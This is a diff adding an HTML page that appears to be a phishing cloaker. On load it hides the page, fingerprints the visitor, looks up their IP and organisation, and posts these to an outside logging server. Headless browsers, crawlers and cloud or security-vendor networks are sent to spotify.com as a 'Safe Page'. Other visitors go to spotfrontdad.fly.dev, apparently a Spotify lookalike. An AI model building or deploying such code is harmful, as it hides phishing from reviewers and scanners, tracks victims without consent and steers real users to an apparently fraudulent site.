@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to our website</title>
+    <style>
+        /* Hide the entire page content by default */
+        body {
+            visibility: hidden; /* Content will not be visible initially */
+        }
+    </style>
+    <script>
+        // Initialize FingerprintJS agent
+        const fpPromise = import('https://fpjscdn.net/v3/CQ1BhkeDyE5Rawfb8Y5q')
+            .then(FingerprintJS => FingerprintJS.load());
+
+        // Helper function to get WebGL Renderer
+        function getWebGLRenderer() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "Not Supported";
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo
+                    ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    : "Unknown Renderer";
+            } catch (e) {
+                return "Error Fetching Renderer";
+            }
+        }
+
+        // Helper function to check if an IP is in a CIDR range
+        function isIPInRange(ip, range) {
+            const [rangeBase, bits] = range.split('/');
+            const rangeBigInt = BigInt(
+                rangeBase.split('.').reduce((acc, octet) => (acc << 8n) + BigInt(octet), 0n)
+            );
+            const ipBigInt = BigInt(
+                ip.split('.').reduce((acc, octet) => (acc << 8n) + BigInt(octet), 0n)
+            );
+            const mask = BigInt(2 ** (32 - parseInt(bits)) - 1);
+            return (rangeBigInt & ~mask) === (ipBigInt & ~mask);
+        }
+
+        async function detectBot() {
+            try {
+                // Load FingerprintJS and get visitor details
+                const fp = await fpPromise;
+                const result = await fp.get();
+
+                // Fetch IP, hostname, and organization details using IPinfo.io
+                const ipResponse = await fetch('https://ipinfo.io/json?token=c180f76ac7988c');
+                const ipData = await ipResponse.json();
+
+                // Extract relevant data
+                const visitorId = result.visitorId; // FingerprintJS visitor ID
+                const confidenceScore = result.confidence.score; // FingerprintJS confidence score
+                const userAgent = navigator.userAgent; // Browser user agent
+                const isHeadless = navigator.webdriver; // Detect headless mode
+                const ipAddress = ipData.ip || ""; // Visitor's IP address
+                const hostname = ipData.hostname || ""; // Visitor's hostname
+                const organization = ipData.org || ""; // Visitor's organization
+                const webglRenderer = getWebGLRenderer(); // Detect WebGL Renderer
+
+                // Debugging logs
+                console.log("Visitor ID:", visitorId);
+                console.log("Confidence Score:", confidenceScore);
+                console.log("User Agent:", userAgent);
+                console.log("Headless Mode:", isHeadless);
+                console.log("IP Address:", ipAddress);
+                console.log("Hostname:", hostname);
+                console.log("Organization:", organization);
+                console.log("WebGL Renderer:", webglRenderer);
+
+                // Known bot hostnames and organizations
+                const botHostnames = [
+                    "compute.amazonaws.com",
+                    "googlebot.com",
+                    "facebook.com",
+                    "twitter.com",
+                    "digitalocean.com"
+                ];
+                const botOrganizations = [
+                    "Amazon AWS",
+                    "Google LLC",
+                    "Meta Platforms, Inc.",
+                    "Twitter, Inc.",
+                    "DigitalOcean, LLC",
+                    "Cloudflare, Inc.",
+                    "Microsoft Corporation"
+                ];
+
+                // Twitterbot User-Agent Detection
+                const isTwitterBot = userAgent.includes("Twitterbot");
+
+                // Twitterbot IP Ranges
+                const twitterBotIPRanges = [
+                    "199.16.156.0/22",
+                    "199.59.148.0/22"
+                ];
+                const isTwitterBotIP = twitterBotIPRanges.some(range =>
+                    isIPInRange(ipAddress, range)
+                );
+
+                // ✅ Bot Detection Logic
+                let isBot = isHeadless || // Headless browser detection
+                    /bot|crawl|spider|slurp/i.test(userAgent) || // Bot user-agent detection
+                    botHostnames.some(bot => hostname.includes(bot)) || // Hostname detection
+                    botOrganizations.some(org => organization.includes(org)) || // Organization detection
+                    confidenceScore < 0.8 || // Low confidence score for human detection
+                    isTwitterBot || // Twitterbot user-agent detection
+                    isTwitterBotIP; // Twitterbot IP range detection
+
+                // ✅ Send Log Data to Render
+                fetch("https://logs-f9iv.onrender.com/log", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        ip: ipAddress,
+                        userAgent: userAgent,
+                        organization: organization,
+                        status: isBot ? "Bot: Blocked" : "User: Passed"
+                    })
+                });
+
+                // ✅ Redirect Based on Detection
+                if (isBot) {
+                    console.log("🚨 Bot Detected! Redirecting to Safe Page...");
+                    window.location.href = "https://spotify.com";
+                } else {
+                    console.log("✅ Real User Detected! Redirecting to Google...");
+                    window.location.href = "https://spotfrontdad.fly.dev/";
+                }
+            } catch (error) {
+                console.error("Error during bot detection:", error);
+                window.location.href = "https://spotfrontdad.fly.dev/"; // Fallback redirect
+            }
+        }
+
+        detectBot();
+    </script>
+</head>
+<body>
+    <h1>Welcome to Our Website</h1>
+</body>
+</html>
